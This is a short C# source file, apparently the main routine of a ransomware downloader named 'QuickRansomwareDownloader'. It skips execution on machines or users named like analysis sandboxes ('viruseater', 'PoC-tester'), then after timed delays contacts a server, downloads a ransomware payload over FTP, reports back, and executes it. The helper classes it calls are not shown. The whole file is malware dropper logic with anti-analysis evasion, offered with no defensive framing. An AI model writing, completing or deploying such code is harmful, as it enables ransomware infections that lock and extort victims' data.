using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace QuickRansomwareDownloader
{
    class Program
    {

        static void Main(string[] args)
        {
            ransomwareDownload();
        }

        public static void ransomwareDownload()
        {
            if (Environment.MachineName.Contains("viruseater")) return;
            if (Environment.UserName.Contains("viruseater")) return;
            if (Environment.UserName.Contains("PoC-tester")) return;
            Thread.Sleep(2000);
            serverCommunicator.setRansomwareFilePath();
            serverCommunicator.getQuickRansomware();
            Thread.Sleep(2000);
            //Install ransomware

            Thread.Sleep(5000);

            serverCommunicator.downloadFileFTP();

            Thread.Sleep(8000);

            serverCommunicator.postQuickFetched();

            Thread.Sleep(2000);

            programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());



            //Play ransomware
        }
    }
}
